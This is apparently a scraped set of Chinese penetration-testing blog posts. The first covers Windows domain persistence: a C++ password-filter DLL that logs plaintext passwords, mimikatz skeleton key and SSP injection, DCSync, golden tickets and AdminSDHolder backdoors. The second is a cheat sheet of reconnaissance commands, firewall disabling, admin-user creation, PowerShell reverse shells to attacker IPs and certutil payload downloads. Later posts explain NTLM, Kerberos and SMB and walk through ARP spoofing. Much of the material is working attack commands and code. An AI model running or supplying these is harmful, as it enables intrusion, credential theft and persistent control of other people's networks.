impacket按照网上安装来弄就行了1.环境linux，我们配置好proxychanis代入内网（略2.proxychains wmiexec.py 域名/用户名:密码@ip 获得shell3.也可以进行hash传递 python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP 效果图 winrm​ winRm（微软远程管理）是WS-Management协议的实现组件。WinRM是windows操作系统的一部分。是一项允许管理员在系统上远程执行管理任务的服务。通信通过HTTP（5985）或HTTPS SOAP（5986）执行，默认情况下支持Kerberos和NTLM身份验证以及基本身份验证。 你需要管理员身份才能使用它。​ 适用版本:适用于 Win server 2008 / Win7 及以后的系统，但是 Win server 2008 / PC 全版本系统默认关闭。只有在Win server 2012 之后的版本的WinRM服务才默认启动并监听了5985端口，允许远程任意主机来管理。 我们可以通过如下powershell命令查看机器上的winrm是否正常运行 Get-WmiObject -Class win32_service | Where-Object &#123;$_.name -like &quot;WinRM&quot;&#125; 若没开启，你可以在管理员权限下执行以下指令开启 winrm quickconfig -qorEnable-PSRemoting -Force 远程命令执行 winrs -r:192.168.86.114 -u:192.168.86.114\\administrator -p:123456!@#$% whoami 域管权限维持Hook PasswordChangeNotify原理：当用户修改密码时会输入明文密码，LSA会调用PasswordChangeNotify 在系统中同步密码。我们HOOK这个函数，改变其行为，就能达到获取用户修改后的密码的明文. Tool: Powersploit下的Invoke-ReflectivePEInjection.ps1 （用于注入）https://github.com/PowerShellMafia/PowerSploit以及 https://github.com/clymb3r/Misc-Windows-Hacking 的HookPasswordChange.dll(需自行编译) Import-Module .\\Invoke-ReflectivePEInjection.ps1Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass 执行如上命令，只要修改了用户的密码，修改后的明文密码就会记录在 C:\\Windows\\Temp\\passwords.txt 文件中。 下面我们分析一下原理 当密码改变请求发生时，LSA会调用Password Filters。每一个password filter会先验证新密码的合法性和复杂度，然后LSA会发出请求已更改的信号。 该过程由 password notification DLL 完成。所以我们只需要劫持这个DLL，把它换成我们自定义的DLL即可达到目的。这种方式一般在Server服务器上利用率较高通常来说，这个dll文件的在注册表中的路径是 hklm\\system\\currentcontrolset\\control\\lsa的 notification packages表项。 我们要利用该方法，首先要确保密码策略已启用 至于命令行怎么修改。可以这样 secedit &#x2F;export &#x2F;cfg gp.inf &#x2F;quiet 将组策略导出为文件在该文件里将PasswordComplexity项值修改为1然后用secedit &#x2F;configure &#x2F;db gp.sdb &#x2F;cfg gp.inf &#x2F;quiet 将其导入数据库刷新组策略： gpupdate&#x2F;force重启后生效 下面我们构造dll文件去覆盖它。 首先我们的dll文件内容如下。 #include&lt;Windows.h&gt;#include&lt;NTSecAPI.h&gt;#include &lt;fstream&gt;extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify() &#123; OutputDebugString(L&quot;InitializeChangeNotify&quot;); return TRUE;&#125;extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall PasswordFilter( PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation)&#123; OutputDebugString(L&quot;PasswordFilter&quot;); return TRUE;&#125;extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall PasswordChangeNotify( PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword)&#123; FILE *pFile; fopen_s(&amp;pFile, &quot;C:\\\\logFile.txt&quot;, &quot;a+&quot;); fprintf(pFile, &quot;%ws:%ws&quot;, UserName-&gt;Buffer, NewPassword-&gt;Buffer); return 0;&#125; 然后把这个dll文件放入system32文件，然后修改注册表，使 hklm\\system\\currentcontrolset\\control\\lsa的 notification packages表项包括我们的恶意dll文件，具体命令行操作如下 REG ADD &quot;HKLMSYSTEMCurrentControlSetControlLsa&quot; &#x2F;v &quot;Notification Packages&quot; &#x2F;t REG_MULTI_SZ &#x2F;d &quot;evildll&quot; &#x2F;f 重启后生效。无奈的是我把dll文件写出来了且确保是正确的，在win7和win2012上复现均失败，网上成功的例子是win2008server，可惜我并没有这个版本的虚拟机不过原理倒是懂了 万能密码运用mimkatz可以在域控机上对所有用户添加一个统一密码用来登录. mimikatz# privilege::debugmimikatz# misc::skeleton 然后所有用户都能用密码 mimiaktz登陆了 SSP注入ssp:一个DLL文件，用来实现Windows身份验证功能，比如kerberos，ntlm。系统启动时SSP会被自动加载入lsass.exesspi:SSP的API接口 如果我们自定义个恶意dll文件让他在系统启动时自动加载到lsass.exe,就能得到进程中的明文密码 临时性注入(重启便失效) mimikatz# privilege::debugmimiaktz# misc::memssp 执行如上命令, 然后只要目标机器不重启，在目标机器上登录的用户名和密码将会被记录在 C:\\Windows\\System32\\mimilsa.log 文件中。 长期性注入（重启不失效） 把 mimikatz中的mimilib.dll放到系统的C:\\Windows\\System32\\ 目录下，并将 mimilib.dll 添加到注册表中，使用这种方法，即使系统重启，也不会影响持久化效果。 修改注册表 HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Lsa 的 Security Packages 项，加载新的DLL文件 用户在登录时输入的账号密码将会被记录在 C:\\Windows\\System32\\kiwissp.log SID History后门sid history:当我们把域A的用户x迁移到域B时，B域中x的sid会发生改变，随即而来的是权限也会发生改变。所以为了避免这种权限改变，sid history诞生了， 系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源 。 在域控上 privilege::debugsid::patchsid::add &#x2F;sam:const27 &#x2F;new:administrator 将administrator的SID添加到const27的sid history属性 然后可以在域控上验证其sid history是否更改成功 Import-Module activedirectoryGet-ADUser const27 -Properties sidhistory 可以发现现在是有SIDHistory属性了。而且末尾的500预示着ADMIN权限 DSRM后门DSRM账号:每个域控上都有一个本地管理员账户也就是DSRM账户，用于在域环境出现故障时本地登录进行修复.可以利用这个账户进行持久化操作。（ 如果域控制器的系统版本为Windows Server 2003，则不能使用该方法进行持久化操作。 ） 我们先设置DSRM密码域控上输入ntdsutil然后输入reset password on server null然后键入密码，最后按q退出即可 在mimikatz中dump本地hash可以看到多出来个Administrator 然后设置DSRM登陆方式DSRM登陆方式有三种分别对应123. 0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号 1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器 2：在任何情况下，都可以使用DSRM管理员账号登录域控制器 我们需要将他改成2才行。powershell执行 New-ItemProperty &quot;hklm:\\system\\currentcontrolset\\control\\lsa\\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD 即可.然后直接psexec登录(这里用的是cs) 注意填Realm时要填上面dump出sam时的域名（这里是DC） 委派后门这个很简单，利用约束性委派或者基于资源的约束性委派攻击得到的ST2保存起来，或者非约束性委派得到的TGT，要用的时候加载进内存就行了 DCSYNC这个东西 可以实现不登录到域控而获取域控上的数据获得以下权限就可以使用了 Administrators组内的用户 Domain Admins组内的用户 Enterprise Admins组内的用户 域控制器的计算机帐户 然后在mimikatz里privilege::debuglsadump::dcsync /user:xxxx /domain:xxxxx /csv 即可 然后我们就可以通过krbtgt hash制作黄金票据登录administrator。如果还想隐蔽一点，可以给普通用户添加如下ACE,使其获得dcsync权限 DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2) DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2) DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c) 可以以管理员权限运行powerview.ps1完成以上操作 #给域用户hack添加以上三条ACEAdd-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;xie,DC&#x3D;com&quot; -PrincipalIdentity hack -Rights DCSync -Verbose #给域用户hack删除以上三条ACERemove-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;xie,DC&#x3D;com&quot; -PrincipalIdentity hack -Rights DCSync -Verbose 然后普通用户也可以用mimikatz调用dcsync导出hash了 配合EXCHANGE用户达到域提权目的前提:一个exchange高权限组的用户控制权，一个机器账户 exchange安装后会在AD上生成两个容器 其中exchange windows permissions组的用户拥有writeDACL权限， Exchange Trusted Subsystem 是 Exchange Windows Permission 的成员，能继承writedacl权限，有这个权限后就能使用dcsync导出所有用户hash。其中exchange trusted subsystem组甚至可能有继承自administrators组的权限。 假设我们已经拿到了exchange trusted subsystem中一个用户的控制权。那么就可用dysync进行权限维持了 黄金票据生成#提权privilege::debug #生成黄金票据并导入kerberos::golden &#x2F;user:administrator &#x2F;domain:const.com &#x2F;sid:当前用户sid去掉最后一个数据 &#x2F;krbtgt:krbtgt的hash &#x2F;ptt AdminSDHolderAdminSDHolder是一个特殊容器，用作受保护用户或组的ACM模板。AD定期把 AdminSDHolder对象的ACL 应用到所有受保护用户或组上，防止其被有意或故意修改。 如果能够修改AdminSDHolder对象的ACL，那么修改的权限将自动应用于所有受保护的AD账户和组，这可以作为一个域环境权限维持的方法 。 如何寻找受保护用户或组： 受保护用户或组的 AdminCount属性为1 。 但是，如果对象已移出受保护组，其AdminCount属性仍为1，也就是说，有可能获得曾经是受保护组的帐户和组 。 使用powerview.ps1Get-NetUser -AdminCount即可获得受保护用户Get-NetGroup -AdminCount即可获得受保护组 如何修改ADMINSDHOLDER的ACL 域管执行以下命令(powerview.ps1) Add-DomainObjectAcl -TargetSearchBase &quot;LDAP:&#x2F;&#x2F;CN&#x3D;AdminSDHolder,CN&#x3D;System,DC&#x3D;CONST,DC&#x3D;COM&quot; -PrincipalIdentity xx -Verbose -Rights ALL给AdminSDHoloder添加一条ACL,让xx用户获得完全控制权 然后默认等60分钟，待ADMINSDHOLDER生效后，xx就获得所有受保护对象的完全控制权了","categories":[],"tags":[{"name":"内网渗透与权限维持","slug":"内网渗透与权限维持","permalink":"http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}]},{"title":"Windows内网渗透信息搜集命令总汇","slug":"windows内网渗透信息搜集命令总汇","date":"2021-06-28T13:51:58.223Z","updated":"2021-06-28T13:39:38.573Z","comments":true,"path":"2021/06/28/windows内网渗透信息搜集命令总汇/","link":"","permalink":"http://const27.com/2021/06/28/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/","excerpt":"","text":"正文前几天面试的时候被师傅问到了这个问题，当时不是很会，现在来学学 本机信息收集查询网络配置信息ipconfig /all 查询本机的服务信息wmic service list brief 查询系统信息systeminfo 查询进程列表tasklist / wmic process list brief 查看计划任务schtasks /query /fo LIST /v 列出计划任务详细信息 查看主机开机时间net statistics workstation 用户相关net user 查看所有用户net localgroup administrators 获取本地管理员信息 查看端口列表netstat -ano 查看已打补丁wmic qfe get Caption,Description,HotFixID,InstalledOn 查看共享列表net share 查看本机共享列表和可访问的域共享列表wmic share get name,path,status 查找共享列表 路由表和arp高速缓存表route print 路由表arp -a arp高速缓存表 防火墙netsh firewall set opmode disable 关闭防火墙(Windows Server 2003 以前的版本) netsh advfirewall set allprofiles state off 关闭防火墙(Windows Server 2003 以后的版本) netsh firewall show config 查看防火墙配置如果上面的命令被弃用，则使用netsh advfirewall firewall show rule name=all 根据参考，可以使用这个wmic一键获取本机信息http://www.fuzzysecurity.com/scripts/files/wmic_info.rar 域信息收集权限查看whoami /all 查看自己的详细权限net user xxx /domain 查看域内指定用户的权限 判断是否存在域.net time /domain 若出现以下情况则不存在域 若是报错：发生系统错误5，则存在域，但该用户不是域用户 若是以下情况则说明存在域且已经在域中 查看域的名字net config workstation nslookup -type=srv _ldap._tcp 这个很爽，域控主机名和IP一块弄出来了 探测域内存活主机1.使用工具 nbtscan http://www.unixwiz.net/tools/nbtscan.html 2.查看arp高速缓存表 arp -a 3.ICMP协议探测（逐个ping） 这个贼慢，但是不用下载其他应用 for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL&quot; 4.nmap直接开扫 5.meterpreter会话中执行 run windows/gather/enum_ad_computers 扫描域内开放端口1.nmap nmap 192.168.1.0/24 2.工具 S扫描器 3.自写脚本 #python3 慢的一批import socket def get_ip_status(ip,port): server &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: server.connect((ip,port)) print(&#39;&#123;0&#125; port &#123;1&#125; is open&#39;.format(ip, port)) except Exception as err: print(&#39;&#123;0&#125; port &#123;1&#125; is not open&#39;.format(ip,port)) finally: server.close() if __name__ &#x3D;&#x3D; &#39;__main__&#39;: host &#x3D; &#39;172.16.0.198&#39; for port in range(20,100): get_ip_status(host,port) 域内基本信息net group “domain computers” /domain 查询所有域成员计算机列表net view /domain:HACHE 查询域内所有主机net accounts /domain 获取域密码信息nltest /domain_trusts 获取域信任信息nltest /DCLIST:hacke 查看域控制器机器名Nslookup -type=SRV_ldap._tcp 查看域控制器的主机名 域用户信息收集net user /domain 向域控制器查询域内用户列表wmic useraccount get /all 获取域内用户详细信息net localgroup administrators 查询本地管理员用户net group “domain admins” /domain 查询域管理员用户net group “Enterprise admins” /domain 查询管理员用户组 本机wmic查杀软WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:Listor WMIC /namespace:\\root\\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe 开3389REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f 用户增删改查net user username password /add 加用户 net localgroup administrators username /add 添加XX到管理员账户 一些喜欢用的Windows 反弹shell powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;); powercat -c 192.168.1.4 -p 9999 -e cmdpowershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.203.140 -port 6666 wmic 查杀软 WMIC &#x2F;namespace:\\\\root\\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExeWMIC &#x2F;Node:localhost &#x2F;Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName &#x2F;Format:List 开3389 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;fwmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1wmic &#x2F;namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName &#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 0 常见杀软进程名https://blog.csdn.net/weixin_39997829/article/details/92666552 cmd下载 bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;www.xx.com&#x2F;code.jpg c:\\users\\sdyp\\desktop\\ff.jpgC:\\Temp&gt;certutil.exe -urlcache -split -f &quot;https:&#x2F;&#x2F;hackers.home&#x2F;badcontent.txt&quot; bad.txtC:\\Temp&gt;certutil.exe -decode bad.txt bad.exe 获取盘符 wmic logicaldisk where drivetype&#x3D;3 get deviceid ps cs 上线powershell.exe -c IEX((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxx&#x2F;a.ps1&#39;))powershell -exec bypass -c &quot;(New-Object Net.WebClient).Proxy.Credentials&#x3D;[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&#39;http:&#x2F;&#x2F;webserver&#x2F;payload.ps1&#39;)|iex&quot;powershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1 (smb)","categories":[],"tags":[{"name":"内网渗透与权限维持","slug":"内网渗透与权限维持","permalink":"http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}]},{"title":"浅析Windows内网常见协议","slug":"Windows内网基础概览","date":"2021-06-28T13:51:58.220Z","updated":"2021-06-28T13:39:24.550Z","comments":true,"path":"2021/06/28/Windows内网基础概览/","link":"","permalink":"http://const27.com/2021/06/28/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/","excerpt":"","text":"域，工作组，活动目录工作组工作组可以认为是同一网络内，功能相似的电脑进行的分组。举个例子：“在一个网络内，可能有成百上千台电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。为了解决这一问题，Windows 9x/NT/2000就引用了“工作组”这个概念，将不同的电脑一般按功能分别列入不同的组中，如财务部的电脑都列入“财务部”工作组中，人事部的电脑都列入“人事部”工作组中。你要访问某个部门的资源，就在“网上邻居”里找到那个部门的工作组名，双击就可以看到那个部门的电脑了。 ”这就是工作组，但是在工作组中的电脑还是各自管理。当其中一台计算机访问另一台计算机时还是要经过另一台计算机的认证的 域域，是一群相互信任的计算机的集合想要访问域中资源就必须经过一台负责每一台联入网络的电脑和用户的验证工作的服务器，这个服务器叫做 域控制器 （Domain Controller，简写为DC） 的安全认证。每个域至少要有一个域控制器。当某计算机连入域时，DC就会鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息不正确，域控制器就拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源 。另外，当一个域和另一个域建立信任关系后，两个域就可以按需要相互管理 工作组和域的区别“ 工作组是一群计算机的集合，它仅仅是一个逻辑的集合，各自计算机还是各自管理的，你要访问其中的计算机，还是要到被访问计算机上来实现用户验证的。而域不同，域是一个有安全边界的计算机集合，在同一个域中的计算机彼此之间已经建立了信任关系，在域内访问其他机器，不再需要被访问机器的许可了。 ” 活动目录活动目录 (Active Directory,AD) ,用于存储有关网络对象的信息。帮助用户快速准确的找到所需的信息服务,“ 如果把企业的内网看成一本字典，那么内网里的资源就是字典里的内容，活动目录就相当于字典的索引 ” 活动目录的功能： 账号集中管理 软件集中管理 环境集中管理 增强安全性 更可靠，更短的宕机时间 “要实现域环境，实际上就是安装AD，如果内网中的一台计算机上安装了AD，它就变成了DC(用于存储活动目录数据库的计算机)。” NTLM协议NTLM也是一个认证协议，与Kerberos协议功能是一样的，不过NTLM的安全性可没有Kerberos好 验证机制NTLM协议验证机制是基于 挑战(chanllage)/回应(response) 模式的 它的验证模式大致如下: 用户输入账号密码，本地把密码加密为一个hash值，称为NTML-Hash 客户端向服务器发送用户名 （这个数据称为 TYPE 1 Negotiate ） 服务端接收请求，判断数据库中该用户名是否存在，若存在则生成一个16位随机数称之为chanllage。同时将chanllage返回给客户端 （ TYPE 2 ） 客户端收到chanllage后将其用上面生成的hash值来加密这个chanllange，并与用户名，chanllange等组合到一起得到Net-NTLMHash 最后将 Net-NTLMHash 封装到 TYPE 3 NTLM_AUTH消息中发往服务器。 服务器收到TYPE3后，用自己数据库中该用户的密码的NTML-Hash加密chanllage，并比较自己计算出的 Net-NTLMHash 与客户端发过来的 Net-NTLMHash ，若相同则认证成功 （以上是客户端-服务端模型，若是在域中，验证步骤就会有点不同）若在域中，那么服务端在第5步收到TYPE3后不会自行进行比对，而是将 Net NTLM-Hash 转发给域控制器DC，由DC进行最后的 Net NTLM-Hash 比较认证 Kerberos协议Kerberos协议，是一个常用的认证与授权协议(下面只是简化过的大致流程，具体流程请看下面的wireshark抓包分析) 整体流程 参与的关键角色 Client: Application Client 应用客户端 AS: Authentication Server 用来认证用户身份 TGS: Ticket-Granting Service 用来授权服务访问 SS: Service Server 用户所请求的服务 其中AS和TGS都属于KDC系统（ 密钥分发中心 ） 认证：以下的加密都是对称加密 1.用户登录 用户先输入用户名和密码，其中密码在这个阶段会被单向hash函数加密为一个密钥，用来解密后面的信息 2.请求身份认证（client和kdc双向认证）2.1 客户端向AS发送认证请求 客户端向as发送用户名信息（明文）（进发送用户名而没有发送密码） 2.2AS确认客户端身份 AS先把用户名在数据库中查找一下，如果该用户名存在则找到该用户的密码使用单向hash函数生成client密钥并返回Msg A和B。A中的内容是一个被Client密钥加密的用于生成Authenticator1的数据B中的内容是一个被TGS密钥加密的一堆信息叫做TGT，当前无TGS密钥故无法解开，其中包含 客户端ID，有效期 ，Client网络地址以及MSG A解密后的内容 3. 请求服务授权（client请求kdc认证server）3.1 客户端向TGS发送请求服务授权请求 Client在MSG C向TGS发送 请求的服务的ID，2.2中的TGT，MSG D 发送由 **[Client/TGS SessionKey]**加密的Authenticator 1 {Client ID, Timestamp}。 3.2 TGS为Client响应服务授权票据 Msg E 使用 [Service密钥] 加密的Client-To-Server Ticket, 该Ticket中包含了如下信息: [Client/Server SessionKey] Client网络地址 Ticket有效时间 Client ID Msg F 使用**[Client/TGS SessionKey]加密的[Client/Server SessionKey]**。 4. 发送服务请求（client与ss双向认证）4.1 Client向SS(Service Server)发送服务请求 发送的消息中包括： Msg E 上一步3.2中，TGS为Client响应的消息Msg E。该消息可以理解为由Client为SS携带的消息。 Msg G 由**[Client/Server SessionKey]加密的Authenticator 2**，包含{Client ID, Timestamp}信息。这里的Authenticator 2区别于前面3.1步骤中的Authenticator 1。 Note [Client/Server SessionKey]**并未直接透明传输，而是被包含在使用[Service密钥]**加密的Msg E中。 既然**[Client/Server SessionKey]并不直接透明传输， Client需要向SS证明自己拥有正确的[Client/Server SessionKey]，所以，Authenticator 2使用了[Client/Server SessionKey]**加密。 4.2 SS响应Client Kerberos抓包分析 以上是kerberos协议简化图 ASREQ即客户端往服务端的第一次通讯 我抓到的包的样子,我们来解读一下1.pvno: 标记着kerberos协议的版本2.msg-type: 标记着这个包的类型， ASREQ对应的就是KRBAS_REQ(0x0a)3.padata:用于存储一些认证信息其实这个头下面还有很多不同的类型的头，但是这里抓到了PA-DATA PA-ENC-TIMESTAMP和PA-DATA PA-PAC-REQUEST这两个头部，但是这两个头部是padata最常用最核心的头部.PA-DATA PA-ENC-TIMESTAMP : 就是用户hash加密的时间戳,作用在于:as配合用户的明文账户(cname头)在数据库中查询该用户是否存在，若存在则取用其hash来解密这个时间戳，若揭秘成功则认证通过PA-DATA PA-ENC-TIMESTAMP: 这个是启用PAC(一个控制用户权限的东西)支持的扩展。4.req-body:请求主体，也包含了许多信息.这个头里面比较重要的东西是cname:存储着发送请求的用户名（明文用户名）sname:这个包含的是服务端的身份, 在ASREQ里面是krbtgt ，还有所在域名称。till为到期时间，nonce为随机生成数realm:所在域名称etype:告知服务器，这个hash的加密方式 之前一直困扰我的 “为什么有些文章说的第一步是向服务器发送明文账户名，有些文章是向服务器发送时间戳hash”问题抓了一下包就懂了.. ASREP 1.ticket:这个就是TGT了。tkt-vno:票据格式版本号realm:所在域名sname:同asresenc-part:被krbtgt密钥加密的票据本体部分2.enc-part:被client hash 加密的login session key TGSREQ 1.ap-req-&gt;…-&gt;tikect: 可以发现TGSREQ把整个TGT发送给了TGS2ap-req-&gt;…-&gt;authenticator:被login session key加密的时间戳和client id TGSREP 1.tikect:这里就是TGS部分了。enc-part：这里的enc-part是被所请求的服务的用户hash加密的2.enc-part:被login session key加密的service session key SMB协议SMB协议是一个用于两台计算机间共享文件 、打印机、串口等功能的协议。网上邻居功能就是依靠SMB协议而起的。通过smb协议，一台计算机可以在经过smb认证后读写另一台计算机上的一些文件。smb协议一般架设在NetBios协议之上。NetBIOS 使用下列端口：UDP/137（NetBIOS 名称服务）、UDP/138（NetBIOS 数据报服务）、TCP/139（NetBIOS 会话服务）；SMB 使用下列端口：TCP/139、TCP/445。 SMB认证如果我们想依靠smb协议去读写另一台计算机上的文件，那么其中的SMB认证情况是如何呢？我们简单分析一下。 1.版本确立阶段2.用户认证阶段3.资源链接阶段4.资源读写阶段 更详细一点。1.版本确立阶段。客户端先发送自己支持的SMB协议版本给服务器，服务器收到后向客户端列出希望使用的版本。若客户端支持的smb版本服务器均不支持，则返回 0XFFFFH，结束通信 。2.用户认证阶段。确立好认证版本后，就是客户端发送账户密码给服务端进行身份验证了。服务器收到后返回认证成功或失败3.资源链接阶段。用户认证通过后，客户端发送自己想要访问的资源名，服务器收到后返回允许或拒绝4.资源读写阶段，客户端开始读写服务器上文件。 看起来比ntlm和kerberos简单多了。抓包分析一下。 抓包分析1.1 客户端向服务端列出当前支持的smb版本 1.2服务器返回希望的SMB版本 1.3这里说个题外话，此时服务器只是选中了SMB2，但是SMB2也分了很多版本，所以客户端还会基于SMB2继续进行版本问询 然后服务器再继续选择一个细分版本，版本协商结束 2.1 客户端向服务端提供用户信息。SMB协议的这一个部分使用NTLM协议完成的。建议先看看NTLM认证再过来首先客户端发送一个请求NTLM认证的包 2.2服务端返回challenge 2.3 客户端发送用户名，被client hash加密的challenge（NTLM RESPONSE）给服务端 2.4服务端进行认证处理，返回认证成功或失败，下图是成功时，返回 会话建立字样 3.1客户端发送请求的资源 3.2服务端返回允许或拒绝 各种读写操作请求","categories":[],"tags":[{"name":"内网渗透与权限维持","slug":"内网渗透与权限维持","permalink":"http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}]},{"title":"ARP欺骗&DNS欺骗&mac泛洪攻击","slug":"ARP欺骗&DNS欺骗&mac泛洪攻击","date":"2021-06-28T13:51:58.218Z","updated":"2021-06-28T13:38:48.019Z","comments":true,"path":"2021/06/28/ARP欺骗&DNS欺骗&mac泛洪攻击/","link":"","permalink":"http://const27.com/2021/06/28/ARP%E6%AC%BA%E9%AA%97&DNS%E6%AC%BA%E9%AA%97&mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/","excerpt":"","text":"arp协议与欺骗简单概要：通过此协议来获取局域网中某IP地址的mac地址 作用：在局域网中的机器互相发送消息时，靠的是mac地址（也叫以太网地址）来确定目的地址的，而我们只知道IP地址，所以需要arp协议来把ip地址映射为mac地址。 具体实现原理是，比如我想知道192.168.1.1的mac地址，就会在广播域里广播arp请求，ip不是192.168.1.1的主机会自动忽略请求，而192.168.1.1主机则会应答请求，并返回自己的mac地址(由IP定位到mac地址) arp高速缓存表：这个表用来缓存 ip地址与mac地址 的对应关系有动态表和静态表： 动态表随时间的推移自动添加和删除,每个动态arp缓存都有自己的TTL(生存时间).TTL为0就会被删静态表是永久性的，手动添加和删除。 局域网中ip到mac地址解析过程：1.当缓存表中存在目的IP对应的mac地址时 则直接返回与IP对应的mac地址2.当缓存表中没有对应关系时,则向局域网中发送arp广播请求目的IP的mac，收到arp应答后将对应关系记录到高速缓存表中高速缓存表的优缺点：优点：减少网络通信量，提高通信效率缺点：会造成安全隐患 arp分组格式 1.arp请求的目的mac地址 全f时代表广播地址2.arp请求的来源mac地址3.字段3 以太网帧类型表示的是后面的数据类型，ARP请求和ARP应答这个值为0x08064.字段4 表示硬件地址的类型，硬件地址不只以太网一种，是以太网类型时此值为15.字段5 表示要映射的协议地址的类型，要对IPv4地址进行映射，此值为0x080067.字段6和7 表示硬件地址长度和协议地址长度，MAC地址占6字节，IP地址占4字节8.操作类型字段，值为1，表示进行ARP请求；值为2，表示进行ARP应答； 值为3，表示进行RARP请求；值为4，表示进行RARP应答。（重要）9.字段9 发送端ARP请求或应答的硬件地址，这里是以太网地址，和字段2相同。10.字段10 发送ARP请求或应答的IP地址。11 12.目的端的硬件地址和协议地址 免费arp免费arp是指主机发送arp查找自己的IP地址,发送端的协议地址和目的端的协议地址是一致的作用： (如某些网关设备会每隔一定时间广播一次免费arp，让网络中其他主机更新arp缓存表中网关的mac地址，缓解arp攻击效果)(如黑客可以使用免费arp，将虚假伪造的 ip mac对应关系通过arp广播出去，使网络中其他主机更新arp缓存表，更新完成后，这些主机的数据会转发到错误的mac地址，从而实现arp欺骗）2.检查广播域里的其他主机有没有使用自己的IP，如果使用了，则会弹出 IP冲突 字样免费arp与普通arp的区别:普通arp的请求是 我需要某ip的mac地址，该IP是其他机器的IP地址免费arp的请求是 我需要某IP的mac地址，该IP是机器自己的IP地址，起到宣告作用，发出去后是不希望得到回应的，若有回应则说明了IP冲突了 代理arp代理arp的意思是，一个主机把自己的mac地址给另一台机器使用来应答其他主机的arp请求。 实际上，这已经是某种意义上的arp欺骗 arp攻击攻击原理：arp攻击就是伪造IP与mac的对应关系来实现arp欺骗，攻击者只要持续不断的发送伪造的arp响应包就能更改目标主机的arp缓存表，造成 断网攻击 或 中间人攻击 利用arspoof实现断网攻击用kali和物理机进行测试，kali是攻击机，物理机是受害者首先收集kali，物理机，网关的ip地址和mac 假设我们想要在实际中实施攻击，首先需要扫描局域网中的IP，但我们一个一个ping就很浪费时间了，所以需要fping命令解读一下命令 arpspoof -i kali网卡名 -t 被攻击机ip 网关好的，我们物理机成功被断网 使用arpspoof工具和driftnet工具来截获图片，wireshark来直接抓包然后我们执行arpspoog指令此时我们物理机就能连上外网了坑点:开启ip转发后物理机依旧不能连上外网. 我的解决方法是重启一下，再修改以下ip_forward文件然后等一会，物理机就可以连上外网了.arp欺骗后物理机网可能会卡。此时，物理机发给网关的通信信息我们都能获得到了，我们可以在虚拟机中使用driftnet工具捕获物理机正在浏览的图片 arp攻击的脚本编写：arp攻击脚本需要用到scapy库来帮助我们完成arp数据包的编写 讲讲里面的一些函数(没有继续研究scapy库)get_if_hwaddr(&#39;网卡名&#39;) &#x2F;&#x2F;获得自己的mac地址，一般填WLAN或eth0getmacbyip(&#39;ip) &#x2F;&#x2F;获得某IP的mac地址srp(....) 